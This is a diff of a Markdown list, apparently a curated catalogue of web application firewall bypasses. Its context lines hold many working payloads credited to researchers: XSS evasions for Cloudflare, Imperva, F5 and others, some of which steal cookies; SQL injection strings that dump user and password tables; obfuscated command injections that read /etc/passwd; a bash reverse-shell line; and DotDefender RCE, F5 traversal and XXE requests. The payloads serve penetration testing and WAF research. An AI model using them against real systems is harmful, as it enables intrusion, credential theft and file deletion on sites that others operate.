@@ -595,7 +595,9 @@ User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 - [Barracuda Spam & Virus Firewall 5.1.3 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40147) by [@xort](https://www.exploit-db.com/?author=479)
 
 ### Cerber (WordPress)
+
 - Username Enumeration Protection Bypass by HTTP Verb Tampering by [@ed0x21son](https://www.exploit-db.com/?author=9901)
+  
 ```
 POST host.com HTTP/1.1
 Host: favoritewaf.com
@@ -604,11 +606,13 @@ User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 author=1
 ```
 - Protected Admin Scripts Bypass by [@ed0x21son](https://www.exploit-db.com/?author=9901)
+  
 ```
 http://host/wp-admin///load-scripts.php?load%5B%5D=jquery-core,jquery-migrate,utils
 http://host/wp-admin///load-styles.php?load%5B%5D=dashicons,admin-bar
 ```
 - REST API Disable Bypass by [@ed0x21son](https://www.exploit-db.com/?author=9901)
+  
 ```
 http://host/index.php/wp-json/wp/v2/users/
 ```
@@ -626,20 +630,24 @@ http://host/index.php/wp-json/wp/v2/users/
 ```
 
 - [`generic_api_call.pl` XSS](https://www.exploit-db.com/exploits/30777) by [@NNPoster](https://www.exploit-db.com/?author=6654)
+  
 ```
 http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e
 ``` 
 
 ### Cloudflare
 - [HTML Injection](https://twitter.com/spyerror/status/1161432029319376897) by [@spyerror](https://twitter.com/spyerror)
+  
 ```
 <div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
 ```
 - [XSS Bypass](https://pastebin.com/i8Ans4d4) by [@c0d3g33k](https://twitter.com/c0d3g33k)
+  
 ```
 <a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
 ```
 - [XSS Bypasses](https://twitter.com/h1_ragnar) by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar)
+  
 ```
 <svg onload=prompt%26%230000000040document.domain)>
 <svg onload=prompt%26%23x000000028;document.domain)>
@@ -647,30 +655,37 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 1'"><img/src/onerror=.1|alert``>
 ```
 - [XSS Bypass](https://twitter.com/RakeshMane10/status/1109008686041759744) by [@RakeshMane10](https://twitter.com/rakeshmane10)
+  
 ```
 <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
 ```
 - [XSS Bypass](https://twitter.com/ArbazKiraak/status/1090654066986823680) by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
+  
 ```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
 ```
 - XSS Bypass by [@Ahmet Ümit](https://twitter.com/ahmetumitbayram)
+  
 ```
 <--`<img/src=` onerror=confirm``> --!>
 ```
 - [XSS Bypass](https://twitter.com/le4rner/status/1146453980400082945) by [@Shiva Krishna](https://twitter.com/le4rner)
+  
 ```
 javascript:{alert`0`}
 ```
 - [XSS Bypass](https://twitter.com/brutelogic/status/1147118371965755393) by [@Brute Logic](https://twitter.com/brutelogic)
+  
 ```
 <base href=//knoxss.me?
 ```
 - [XSS Bypass](https://twitter.com/RenwaX23/status/1147130091031449601) by [@RenwaX23](https://twitter.com/RenwaX23) (Chrome only)
+  
 ```
 <j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x 
 ```
 - [RCE Payload Detection Bypass](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
+  
 ```
 cat$u+/etc$u/passwd$u
 /bin$u/bash$u <ip> <port>
@@ -679,22 +694,26 @@ cat$u+/etc$u/passwd$u
 
 ### Comodo 
 - XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
+  
 ```
 <input/oninput='new Function`confir\u006d\`0\``'>
 <p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
 ```
 - SQLi by [@WAFNinja](https://waf.ninja)
+  
 ```
 0 union/**/select 1,version(),@@datadir
 ```
 
 ### DotDefender
 - Firewall disable by (v5.0) by [@hyp3rlinx](http://hyp3rlinx.altervista.org)
+  
 ```
 PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+
 <enabled>false</enabled>
 ```
 - Remote Command Execution (v3.8-5) by [@John Dos](https://www.exploit-db.com/?author=1996)
+  
 ```
 POST /dotDefender/index.cgi HTTP/1.1
 Host: 172.16.159.132
@@ -713,6 +732,7 @@ Content-Length: 95
 sitename=dotdefeater&deletesitename=dotdefeater;id;ls -al ../;pwd;&action=deletesite&linenum=15
 ```
 - Persistent XSS (v4.0) by [@EnableSecurity](https://enablesecurity.com)
+  
 ```
 GET /c?a=<script> HTTP/1.1
 Host: 172.16.159.132
@@ -726,17 +746,20 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 Keep-Alive: 300
 ```
 - R-XSS Bypass by [@WAFNinja](https://waf.ninja)
+  
 ```
 <svg/onload=prompt(1);>
 <isindex action="javas&tab;cript:alert(1)" type=image>
 <marquee/onstart=confirm(2)>
 ```
 - XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
+  
 ```
 <p draggable=True ondragstart=prompt()>alert
 <bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
 ```
 - GET - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
+  
 ```
 /search?q=%3Cimg%20src=%22WTF%22%20onError=alert(/0wn3d/.source)%20/%3E
 
@@ -745,18 +768,21 @@ Keep-Alive: 300
 h%2Bn)(/0wn3d/.source)" />
 ```
 - POST - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
+  
 ```
 <img src="WTF" onError="{var
 {3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/
 .source)" />
 ```
 - `clave` XSS (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
+  
 ```
 /?&idPais=3&clave=%3Cimg%20src=%22WTF%22%20onError=%22{ 
 ```
 
 ### Fortinet Fortiweb
 - `pcre_expression` unvaidated XSS by [@Benjamin Mejri](https://www.exploit-db.com/?author=7854)
+  
 ```
 /waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
 /waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0 
@@ -764,6 +790,7 @@ h%2Bn)(/0wn3d/.source)" />
 - CSP Bypass by [@Binar10](https://www.exploit-db.com/exploits/18840)
 
 POST Type Query
+
 ```
 POST /<path>/login-app.aspx HTTP/1.1
 Host: <host>
@@ -775,13 +802,16 @@ Content-Length: <the content length must be at least 2399 bytes>
 
 var1=datavar1&var2=datavar12&pad=<random data to complete at least 2399 bytes>
 ```
+
 GET Type Query
+
 ```
 http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>
 ```
 
 ### F5 ASM 
 - XSS Bypass by [@WAFNinja](https://waf.ninja)
+  
 ```
 <table background="javascript:alert(1)"></table>
 "/><marquee onfinish=confirm(123)>a</marquee>
@@ -789,22 +819,27 @@ http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>
 
 ### F5 BIG-IP
 - XSS Bypass by [@WAFNinja](https://waf.ninja/)
+  
 ```
 <body style="height:1000px" onwheel="[DATA]">
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
 <body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
 ```
+
 - XSS Bypass by [@Aatif Khan](https://twitter.com/thenapsterkhan)
+  
 ```
 <body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
 <div contextmenu="xss">Right-Click Here<menu id="xss"onshow="prom%25%32%33%25%32%36x70;t(1)“>
 ```
 - [`report_type` XSS](https://www.securityfocus.com/bid/27462/info) by [@NNPoster](https://www.exploit-db.com/?author=6654)
+  
 ```
 https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+
 ```
 - POST Based XXE by [@Anonymous](https://www.exploit-db.com/?author=2168)
+  
 ```
 POST /sam/admin/vpe2/public/php/server.php HTTP/1.1
 Host: bigip
@@ -818,10 +853,13 @@ Content-Length: 143
 - Directory Traversal by [@Anastasios Monachos](https://www.exploit-db.com/?author=2932)
 
 Read Arbitrary File
+
 ```
 /tmui/Control/jspmap/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd
 ```
+
 Delete Arbitrary File
+
 ```
 POST /tmui/Control/form HTTP/1.1
 Host: site.com
@@ -837,6 +875,7 @@ _form_holder_opener_=&handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&handler_be
 
 ### F5 FirePass
 - SQLi Bypass from [@Anonymous](https://www.exploit-db.com/?author=2168)
+  
 ```
 state=%2527+and+
 (case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+
@@ -845,50 +884,63 @@ BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
 
 ### ModSecurity
 - [RCE Payloads Detection Bypass for PL3](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.1)
+  
 ```
 ;+$u+cat+/etc$u/passwd$u
 ```
 - [RCE Payloads Detection Bypass for PL2](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.1)
+  
 ```
 ;+$u+cat+/etc$u/passwd+\#
 ```
 - [RCE Payloads for PL1 and PL2](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.0)
+  
 ```
 /???/??t+/???/??ss??
 ```
 - [RCE Payloads for PL3](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.0)
+  
 ```
 /?in/cat+/et?/passw?
 ```
 - [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Johannes Dahse](https://twitter.com/#!/fluxreiners) (v2.2)
+  
 ```
 0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
 ```
 - [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Yuri Goltsev](https://twitter.com/#!/ygoltsev) (v2.2)
+  
 ```
 1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
 ```
+
 - [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Ahmad Maulana](http://twitter.com/#!/hmadrwx) (v2.2)
+  
 ```
 1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
 ```
 - [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Travis Lee](http://twitter.com/#!/eelsivart) (v2.2)
+  
 ```
 amUserId=1 union select username,password,3,4 from users
 ```
 - [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Roberto Salgado](http://twitter.com/#!/lightos) (v2.2)
+  
 ```
 %0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
 ```
 - [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Georgi Geshev](http://twitter.com/#!/ggeshev) (v2.2)
+  
 ```
 1%0bAND(SELECT%0b1%20FROM%20mysql.x)
 ```
 - [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@SQLMap Devs](http://sqlmap.sourceforge.net/#developers) (v2.2)
+  
 ```
 %40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
 ```
 - [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@HackPlayers](http://twitter.com/#!/hackplayers) (v2.2)
+  
 ```
 %0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201
 ```
@@ -896,19 +948,24 @@ amUserId=1 union select username,password,3,4 from users
 ### Imperva
 - [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
 - XSS Bypass by [@David Y](https://twitter.com/daveysec)
+  
 ```
 <svg onload\r\n=$.globalEval("al"+"ert()");>
 ```
 - XSS Bypass by [@Emad Shanab](https://twitter.com/alra3ees)
+  
 ```
 <svg/onload=self[`aler`%2b`t`]`1`>
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 ```
+
 - XSS Bypass by [@WAFNinja](https://waf.ninja)
+  
 ```
 %3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
 ```
 - XSS Bypass by [@i_bo0om](https://twitter.com/i_bo0om)
+  
 ```
 <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
 <img/src=q onerror='new Function`al\ert\`1\``'>
